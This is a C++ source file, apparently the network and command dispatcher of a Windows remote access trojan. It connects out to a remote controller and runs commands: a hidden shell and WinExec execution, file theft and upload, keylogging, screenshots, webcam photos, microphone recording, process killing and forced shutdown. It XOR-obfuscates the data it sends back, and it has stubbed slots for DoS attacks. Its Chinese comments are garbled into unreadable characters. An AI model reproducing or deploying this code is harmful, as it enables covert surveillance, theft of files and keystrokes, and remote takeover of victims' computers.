#pragma once

#include"pch.h"
#include <iostream>
#include <string> 
#include <iostream>  
#include <WINDOWSX.H>
#include <windows.h>

#include "mStruct.cpp"
#include "ThreadSafeQueue.cpp"

#include <fstream>
#include "commandManager.cpp"
#include "fileManager.cpp"
#include "keyboardManager.cpp"
#include "infoManager.cpp"
#include "voiceManager.cpp"
#include "videoManager.cpp"
#include "screenManager.cpp"
#include "processManager.cpp"
#include "netManager.h"




using namespace std;

#pragma comment(lib, "WS2_32.lib")  //windwows�µ�socket��̺�����


/*
order:

1: ϵͳ�汾
2: CPU��Ϣ
3: �ڴ�����
4: �ڴ�ʹ����
5: �Ƿ��������ͷ
6: �������
7: �û���
8: ����
9���ϴ�
10: CPUʹ����
11: ����ϴΰ�����ʱ�䣬�����ж��뿪ʱ��
12:��ʶ��

20��������
21���ر�������

30���鿴�ļ��б�
31��ɾ���ļ�
32���ļ�������
33����ָ������վ�����ļ�	δʵ��
34�������ļ�
35���ϴ��ļ�
36������ָ������	

40���������̼�¼
41���رռ��̼�¼

50�����̲鿴
51��ɱ������

60����Ļ��ͼ
61������

70��¼��
71��ֹͣ¼��

80��ֹͣDos		δʵ��
81��http DOS	δʵ��
82��tcp DOS		δʵ��
83��UDP DOS		δʵ��


90���Ͽ�����
91���ػ�
92������
93���˳�����



*/


netManager::netManager(string ip,int port,SOCKET* s) {
	remoteIP = ip;
	remotePort = port;
	sock = s;
	int zero = 0;
	setsockopt(*sock, SOL_SOCKET, SO_SNDBUF, (char*)&zero, sizeof(zero));
	setsockopt(*sock, SOL_SOCKET, SO_RCVBUF, (char*)&zero, sizeof(zero));
}

netManager::~netManager() {
	finishNet();
}

int netManager::init() {
		

	*sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (*sock == INVALID_SOCKET)  
	{
		return -1;
	}
	sockaddr_in sin;
	sin.sin_family = AF_INET;   //��������Э��������
	sin.sin_port = htons(remotePort);  //����Զ�̼�����Ķ˿ں�
	sin.sin_addr.S_un.S_addr = inet_addr(remoteIP.c_str());//����Զ�̼������IP��ַ 
	if (connect(*sock, (sockaddr*)&sin, sizeof(sockaddr)) == -1)
	{
		return -1;  
	}
	state = true;
	return 0;
}

void netManager::start() {
	_time64(&lastTime);
	thread t1(std::bind(&netManager::myRecv, this));
	//thread t2(std::bind(&netManager::mySend, this));
	thread t3(std::bind(&netManager::sendState, this));

	t1.detach();
	//t2.detach();
	t3.detach();
		
}

void netManager::sendState() {
	infoManager im;
	im.getAll();
	addOrder();
	while (state) {
		Sleep(30 * 1000);
		im.GetLastInputTime();
		im.getSpeed();
		im.getCPURate();
		im.getMemRate();
		addOrder();
	}
}

void netManager::finishNet() {
	if (*sock != 0) {
		closesocket(*sock);  //�ر����TCP����ͨ������
	}
	state = false;
		
}

void netManager::myRecv() {
	//char buffLong[4] = { 0 };
	commandManager cmdm;
	fileManager fm;
	infoManager im;
	keyboardManager km;
	processManager pm;
	screenManager sm;
	voiceManager voicem;
	videoManager videom;
	int  nRecv = 0;  //����һ����������յ��������ֽڳ���   
	char buff[20];
	int l = 0;//��ʾ���ض˷����������ݵĴ�С
	char flagBuff[15] = {0};
	int i = 0;
	short order = 0;
	short ordertmp = 0;
	int t = 0;//��ʱ int
	int t2 = 0;
	unsigned long t3=0,t4;
	string path1="";
	string path2 = "";
	string oldname = "";
	string newname = "";
	string path = "";
	string filename = "";
	FILE * fp;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tkp = { 0 };
	//cout << "this is recv" << endl;
	while (state) {
			
		nRecv = recv(*sock, buff, 20, 0);

		if (nRecv == -1) {
			finishNet();
			return;
		}
		if (nRecv == 20)
		{
			l = ((int)buff[0]+256)%256;
			l += (((int)buff[1] + 256) % 256) * 0x100;
			l += (((int)buff[2] + 256) % 256) * 0x100 * 0x100;
			l += (((int)buff[3] + 256) % 256) * 0x100 * 0x100 * 0x100;
			if (l > 1073741824)continue;

			for (i = 0; i < 14; i++) {
				flagBuff[i] = buff[i + 5];
			}
			flagBuff[14] = 0;
			if (strcmp(flagBuff, "CTF{e/j-9'8zH}") != 0) {
				continue;
			}
				
			order = ((short)buff[4] + 256) % 256;
			ordertmp = ((short)buff[19] + 256) % 256;
			if (order != ordertmp)continue;
			char *data = NULL;
			if (l > 0) {
				data = new char[l + 1];
				nRecv = recv(*sock, data, l, 0);
				data[l] = 0;				
			}
				
				
			_time64(&lastTime);
			switch(order) {
			case 1: im.getVersion(); break;// ϵͳ�汾
			case 2: im.getCpuInfo(); break;// CPU��Ϣ
			case 3: im.getMemTotal(); break;// �ڴ�����
			case 4: im.getMemRate(); break;// �ڴ�ʹ����
			case 5: im.haveWebCam(); break;// �Ƿ��������ͷ
			case 6: im.getComputerName(); break;// �������
			case 7: im.getUserName(); break;// �û���
			case 8: 
			case 9:
				im.getSpeed(); break;// ���� �ϴ�
			case 10: im.getCPURate(); break;// CPUʹ����
			case 11: im.GetLastInputTime(); break;// ����ϴΰ�����ʱ�䣬�����ж��뿪ʱ��
			case 12:im.getIDCode(); break;//��ȡ��ʶ��
			case 20: 
				if (nRecv < 1)break;
				if (cmdm.state == 0) {
					cmdm.startCMD();
				}
				cmdm.WriteToPipe(data);
				break;//������
			case 21://�ر�������
				cmdm.stopCMD();
				break;
			case 30: 
				if (nRecv < 1)break;
				
				fm.getPath(tool::UTF8ToGBK(data)); break;//�ļ��б�
			case 31://ɾ���ļ�
				if (nRecv < 1)break;
				fm.fileDelete(tool::UTF8ToGBK(data));
				break;

				break;
			case 32://�ļ�������
			case 33://�ļ�����
				if (nRecv < 7)break;
				path1 = "";
				path2 = "";
				oldname = "";
				newname = "";

				for (i = 0; i < l + 1; i++) {
					if (data[i] == '|')break;
					path1 += data[i];
				}

				for (i++; i < l + 1; i++) {
					if (data[i] == '|')break;
					oldname += data[i];
				}
				for (i++; i < l + 1; i++) {
					if (data[i] == '|')break;
					path2 += data[i];
				}
				for (i++; i < l + 1; i++) {
					if (data[i] == 0)break;
					newname += data[i];
				}
				if (path1.length() > 0 && path2.length() > 0 && newname.length() > 0 && oldname.length() > 0) {
					if (order == 32) {
						fm.fileMV(tool::UTF8ToGBK(path1.c_str()), tool::UTF8ToGBK(oldname.c_str()), tool::UTF8ToGBK(path2.c_str()), tool::UTF8ToGBK(newname.c_str()));
					}
					else if(order==33) {
						fm.fileCopy(tool::UTF8ToGBK(path1.c_str()), tool::UTF8ToGBK(oldname.c_str()), tool::UTF8ToGBK(path2.c_str()), tool::UTF8ToGBK(newname.c_str()));
					}
					
				}
				break;



			case 34://��ָ������վ�����ļ�


				break;
			case 35://����˽��տͻ��˵��ļ�
				if (nRecv < 1)break;
				filename = "";
				for (i = 0; i < nRecv; i++) {
					filename += data[i]^nRecv;
				}
				filename = tool::UTF8ToGBK(filename.c_str());
				sendfileQueue.push(filename);
				addOrder();


				break;
			case 36://�ͻ��˽��շ���˵��ļ�
				if (nRecv < 4)break;
				t3 = ((int)data[0] + 0x100) % 0x100;
				t3 += (((int)data[1] + 0x100) % 0x100) * 0x100;
				t3 += (((int)data[2] + 0x100) % 0x100) * 0x100 * 0x100;
				t3 += (((int)data[3] + 0x100) % 0x100) * 0x100 * 0x100 * 0x100;//�ļ���С

				filename = "";
				for (i = 4; i < l; i++) {
					if ((data[i] ^ l) == '|')break;
					filename += data[i]^l;
				}
				filename = tool::UTF8ToGBK(filename.c_str());
				path = "";
				for (i++; i < l; i++) {
					path += data[i]^l;
				}
				path = tool::UTF8ToGBK(path.c_str());

				fp = fopen((path + "/" + filename).c_str(),"wb");
				//cout << "ʵ�ʴ򿪵��ļ�:" << path + "/" + filename;

				if (fp == nullptr)fp = fopen(filename.c_str(), "wb");
				if (fp == nullptr)break;

				data = new char[1024];
				t4 = 0;
				while ( state ) {
					nRecv = recv(*sock, data, 1024, 0);
					for (i = 0; i < nRecv; i++) {
						data[i] = data[i] ^ l;
					}
					t4 += nRecv;
					if (t4 < t3) {

						fwrite(data, sizeof(char), nRecv, fp);
					}
					else {
						fwrite(data, sizeof(char), t3+nRecv-t4, fp);
						break;
					}
					if (t4 >= t3)break;

				}
				fclose(fp);
				//cout << "file recv finish" << endl;
				


				break;
			case 37://����ָ������
				if (nRecv < 1)break;
				WinExec(tool::UTF8ToGBK(data).c_str(), SW_HIDE);

				break;

			case 40: //�������̼�¼
				//cout << "�������̼�¼" << endl;
				if (nRecv < 4)break;

				t = ((int)data[0] + 0x100)%0x100;
				t += (((int)data[1] + 0x100) % 0x100) * 0x100;
				t += (((int)data[2] + 0x100) % 0x100) * 0x100 * 0x100;
				t += (((int)data[3] + 0x100) % 0x100) * 0x100 * 0x100 * 0x100;
				//cout << "�������̼�¼" << t << endl;
				km.start(t);
				break;
			case 41: km.stop(); break;//�رռ��̼�¼
			case 50: pm.getProcessList(); break;//���̲鿴
			case 51: //ɱ������
				if (nRecv < 4)break;

				t = ((int)data[0] + 0x100) % 0x100;;
				t += (((int)data[1] + 0x100) % 0x100) * 0x100;
				t += (((int)data[2] + 0x100) % 0x100) * 0x100 * 0x100;
				t += (((int)data[3] + 0x100) % 0x100) * 0x100 * 0x100 * 0x100;
				pm.KillProcessById(t);
				break;
			case 60: sm.screenAndZlib(); break;//��Ļ��ͼ
			case 61: videom.takePhoto(); break;//����
			case 70:  //¼��
				voicem.start();
				break;
			case 71:  //ֹͣ¼��
				voicem.stop();
				break;

			case 80: //ֹͣDOS
				break;
			case 81: //http DOS
				break;
			case 82://tcp  DOS 
				break;
			case 83://udp dos 
				break;

			case 90://�Ͽ����� 
				break;
			case 91: //�ػ�
				hToken = NULL;
				tkp = { 0 };
				//�򿪵�ǰ�����Ȩ������
				if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
				{
					continue;
				}
				//���ĳһ�ض�Ȩ�޵�Ȩ�ޱ�ʶLUID��������tkp��
				if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid))
				{
					CloseHandle(hToken);
					continue;
				}
				tkp.PrivilegeCount = 1;
				tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
				//����AdjustTokenPrivileges������������Ҫ��ϵͳȨ��
				if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
				{
					CloseHandle(hToken);
					continue;
				}
				ExitWindowsEx(EWX_SHUTDOWN, EWX_FORCEIFHUNG);
				break;
			case 92: //����
				//����ʧ�ܵģ��Ƿ��͸���ǰ����ĳ���һ���������ź�
				SendMessage(GetForegroundWindow(), WM_APPCOMMAND, 0x200eb0, APPCOMMAND_VOLUME_MUTE * 0x10000);


				break;
			case 93: 
				exit(0);//�˳�����
				break;
			default: break;
				
			}
			delete data;
			data=nullptr;
			addOrder();

		}
		Sleep(10);
	}

}

void netManager::mySend() {
	string tmpstr;
	mfile tmpfile;
	minfo tmpinfo;
	mscreen tmpscreen;
	mprocess tmpprocess;
	mvoice tmpvoice;
	mvideo tmpvideo;
	string filename, tmpname;
	FILE *fp;
	char *buff;
	int l, i, l2;
	long long ll;
	char p[] = "CTF{e/j-9'8zH}";
	//std::cout << "state" << state<<endl;


	if (state) {
		mut.lock();
		while (state && commandManager::cmdQueue.size() > 0) {
			if (commandManager::cmdQueue.try_pop(tmpstr)) {
				l = tmpstr.length();
				buff = new char[l + 20];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = 20;//cmd
				buff[19] = 0;
				for (i = 0; i < tmpstr.length(); i++) {
					buff[i + 20] = tmpstr.c_str()[i] ^ 12322;//����
				}
				send(*sock, buff, tmpstr.length() + 20, 0);
				//cout << "send cmd:" << endl;
				delete buff;
			}


		}
		while (state && fileManager::fileQueue.size() > 0) {
			if (fileManager::fileQueue.try_pop(tmpfile)) {
				l = tmpfile.fileName.length() + 53;
				buff = new char[l + 20];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = 30;//file list
				buff[19] = 0;
				buff[20] = tmpfile.isRoot;
				ll = tmpfile.fileTotalSize;
				for (i = 0; i < 8; i++) {
					buff[21 + i] = ll % 0x100;
					ll /= 0x100;
				}
				ll = tmpfile.fileFreeSize;
				for (i = 0; i < 8; i++) {
					buff[29 + i] = ll % 0x100;
					ll /= 0x100;
				}

				l = tmpfile.diskType;
				for (i = 0; i < 4; i++) {
					buff[37 + i] = l % 0x100;
					l /= 0x100;
				}
				l = tmpfile.attrib;
				for (i = 0; i < 4; i++) {
					buff[41 + i] = l % 0x100;
					l /= 0x100;
				}

				ll = tmpfile.time_create;
				for (i = 0; i < 8; i++) {
					buff[45 + i] = ll % 0x100;
					ll /= 0x100;
				}
				ll = tmpfile.time_access;
				for (i = 0; i < 8; i++) {
					buff[53 + i] = ll % 0x100;
					ll /= 0x100;
				}
				ll = tmpfile.time_write;
				for (i = 0; i < 8; i++) {
					buff[61 + i] = ll % 0x100;
					ll /= 0x100;
				}
				l = tmpfile.size;
				for (i = 0; i < 4; i++) {
					buff[69 + i] = l % 0x100;
					l /= 0x100;
				}

				for (i = 0; i < tmpfile.fileName.length(); i++) {
					buff[i + 20 + 53] = tmpfile.fileName.c_str()[i] ^ tmpfile.fileName.length();//���ܣ���ֹ������¶
				}

				send(*sock, buff, tmpfile.fileName.length() + 20 + 53, 0);
				//std::cout << "send filelist:" << endl;
				delete buff;

			}
		}
		while (state && infoManager::infoQueue.size() > 0) {
			if (infoManager::infoQueue.try_pop(tmpinfo)) {
				l = tmpinfo.data.length();

				buff = new char[l + 20];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = tmpinfo.infoIndex % 0x100;//info
				buff[19] = 0;
				for (i = 0; i < tmpinfo.data.length(); i++) {
					buff[i + 20] = tmpinfo.data.c_str()[i] ^ tmpinfo.data.length();
				}
				send(*sock, buff, tmpinfo.data.length() + 20, 0);
				//std::cout << "send info:" << endl;
				delete buff;

			}

		}
		while (state && keyboardManager::keyQueue.size() > 0) {
			if (keyboardManager::keyQueue.try_pop(tmpstr)) {
				l = tmpstr.length();
				buff = new char[l + 20];
				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = 40;//����
				buff[19] = 0;
				for (i = 0; i < tmpstr.length(); i++) {
					buff[i + 20] = tmpstr.c_str()[i] ^ 12322;//����
				}
				send(*sock, buff, tmpstr.length() + 20, 0);
				//std::cout << "send key:" << endl;
				delete buff;

			}

		}
		while (state && screenManager::screenQueue.size() > 0) {
			if (screenManager::screenQueue.try_pop(tmpscreen)) {

				l = 8 + tmpscreen.bmpZipSize;
				buff = new char[20 + l];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = 60;//��ͼ
				buff[19] = 1;
				l = tmpscreen.bmpZipSize;
				for (i = 0; i < 4; i++) {
					buff[i + 20] = l % 0x100;
					l /= 0x100;
				}
				l = tmpscreen.bmpSize;
				for (i = 0; i < 4; i++) {
					buff[i + 24] = l % 0x100;
					l /= 0x100;
				}
				for (i = 0; i < tmpscreen.bmpZipSize; i++) {
					buff[28 + i] = tmpscreen.bmpZipMem[i];
				}



				send(*sock, buff, 20 + 8 + tmpscreen.bmpZipSize, 0);
				delete buff;
				delete tmpscreen.bmpZipMem;
				tmpscreen.bmpZipMem = nullptr;
			}
		}
		while (state && processManager::processQueue.size() > 0) {
			if (processManager::processQueue.try_pop(tmpprocess)) {
				l = 4 + tmpprocess.pName.length();
				buff = new char[20 + l];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = 50;//���̲鿴
				buff[19] = 0;
				l = tmpprocess.pID;
				for (i = 0; i < 4; i++) {
					buff[i + 20] = l % 0x100;
					l = l / 0x100;
				}


				for (i = 0; i < tmpprocess.pName.length(); i++) {
					buff[i + 24] = tmpprocess.pName.c_str()[i] ^ tmpprocess.pID;//ʹ�����������ݣ���ֹ�������п���������Ϣ
				}
				send(*sock, buff, 20 + 4 + tmpprocess.pName.length(), 0);
				delete buff;
				//cout << "send process" << endl;
			}
		}

		while (state && videoManager::videoQueue.size() > 0) {
			if (videoManager::videoQueue.try_pop(tmpvideo)) {

				l = 8 + tmpvideo.bmpZipSize;
				buff = new char[20 + l];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = 61;//����
				buff[19] = 1;
				l = tmpvideo.bmpZipSize;
				for (i = 0; i < 4; i++) {
					buff[i + 20] = l % 0x100;
					l /= 0x100;
				}
				l = tmpvideo.bmpSize;
				for (i = 0; i < 4; i++) {
					buff[i + 24] = l % 0x100;
					l /= 0x100;
				}
				for (i = 0; i < tmpvideo.bmpZipSize; i++) {
					buff[28 + i] = tmpvideo.bmpZipMem[i];
				}

				send(*sock, buff, 20 + 8 + tmpvideo.bmpZipSize, 0);
				delete buff;
				delete tmpvideo.bmpZipMem;

			}
		}
		while (state && voiceManager::voiceQueue.size() > 0) {
			if (voiceManager::voiceQueue.try_pop(tmpvoice)) {
				l = 8 + tmpvoice.voiceZipSize;
				buff = new char[20 + l];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}
				buff[18] = 70;//����
				buff[19] = 1;
				l = tmpvoice.voiceZipSize;
				for (i = 0; i < 4; i++) {
					buff[i + 20] = l % 0x100;
					l /= 0x100;
				}
				l = tmpvoice.voiceSize;
				for (i = 0; i < 4; i++) {
					buff[i + 24] = l % 0x100;
					l /= 0x100;
				}
				for (i = 0; i < tmpvoice.voiceZipSize; i++) {
					buff[28 + i] = tmpvoice.voiceZipMem[i];
				}

				send(*sock, buff, 20 + 8 + tmpvoice.voiceZipSize, 0);

				delete buff;
				delete tmpvoice.voiceZipMem;
			}
		}
		while (state && sendfileQueue.size() > 0) {
			if (sendfileQueue.try_pop(filename)) {
				//cout << "���ļ�" << filename << endl;

				if (filename.find_last_of('/') > 0) {//�����ļ�ȫ·���е�·��
					tmpname = filename.substr(filename.find_last_of('/') + 1);
				}

				buff = new char[256];
				for (i = 0; i < tmpname.length(); i++) {
					buff[i] = tmpname.c_str()[i];
				}
				buff[tmpname.length()] = 0;


				tmpname = tool::GBKToUTF8(buff);
				delete buff;


				fp = fopen(filename.c_str(), "rb");

				if (fp == nullptr) {
					//cout << "���ļ�ʧ��" << endl;
					continue;
				}
				fseek(fp, 0, SEEK_END);				///���ļ�ָ���ƶ��ļ���β
				l2 = ftell(fp);						///�����ǰ�ļ�ָ������ļ���ʼ���ֽ���



				l = 4 + tmpname.length();
				buff = new char[20 + l];

				for (i = 0; i < 4; i++) {
					buff[i] = l % 0x100;
					l = l / 0x100;
				}
				for (i = 4; i < 18; i++) {
					if (strlen(p) < i - 4) {
						buff[i] = 0;
					}
					else {
						buff[i] = p[i - 4];
					}
				}

				buff[18] = 35;
				buff[19] = 0;

				for (i = 0; i < 4; i++) {
					buff[20 + i] = l2 % 0x100;
					l2 = l2 / 0x100;
				}
				for (i = 0; i < tmpname.length(); i++) {
					buff[24 + i] = tmpname.c_str()[i] ^ (4 + tmpname.length());
				}

				send(*sock, buff, 20 + 4 + tmpname.length(), 0);

				delete buff;

				std::rewind(fp);

				buff = new char[1024];
				int read = 0;
				while (state) {//���϶�ȡ�ļ�����
					read = fread(buff, sizeof(char), sizeof(buff), fp);
					for (i = 0; i < read; i++) {
						buff[i] = buff[i] ^ (4 + tmpname.length());
					}
					send(*sock, buff, read, 0);
					if (feof(fp))break;
				}
				fclose(fp);
				//std::cout << "send file:" << endl;


			}
			
		}
		mut.unlock();
	}

}

void netManager::addOrder() {
	std::thread t2(std::bind(&netManager::mySend, this));
	t2.detach();
}






















